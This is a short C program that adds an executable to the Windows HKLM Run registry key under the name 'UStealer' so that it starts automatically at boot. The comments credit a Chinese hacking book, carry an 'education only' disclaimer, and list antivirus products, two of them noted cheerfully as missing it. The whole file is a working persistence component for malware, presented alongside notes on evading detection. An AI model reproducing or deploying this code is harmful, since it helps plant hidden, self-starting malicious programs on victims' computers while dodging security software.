//For education purpose only,Don't use it for illegal way!!!
//write the Registry "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
//to autorun.
//This code is not writen by me.It comes from <<Windows黑客技术揭秘与攻防-C语言版>> 
//author：裴要强、孟波
#include <Windows.h>
bool AutoRun(char AppPath[])//AppPath is your app full path
{
	HKEY hkey = NULL;
	DWORD rc;
	char buff[MAX_PATH] = { 0 };
	rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		KEY_ALL_ACCESS,
		&hkey);
	if (rc == ERROR_SUCCESS)
	{
		rc=RegSetValueExA(hkey, "UStealer", 0, REG_SZ, (BYTE*)AppPath,strlen(AppPath));//set value
		RegCloseKey(hkey);
		if(rc==ERROR_SUCCESS)return true;//success
	}
	return false;//fail
}
//delete following code...
int main()
{
	char AppName[] = "C:\\Users\\Administrator\\Desktop\\HackTest.exe";//replace it with your app's path
	AutoRun(AppName);
	return 0;
}
//additional information
/*
Compiled with VS217 in Windows10 x64,the app can run in win 10 x64 & win 7 x64
RUN IT AS ADMINISTRATOR OR YOU WILL FAIL
Anti-virus software:
“360安全卫士”：it can  detect the app as a virus and it tell user the app want to start up
"火绒"（www.huorong.cn）:No detected:)
"Tencent PC Manager":NO Detected:)
*/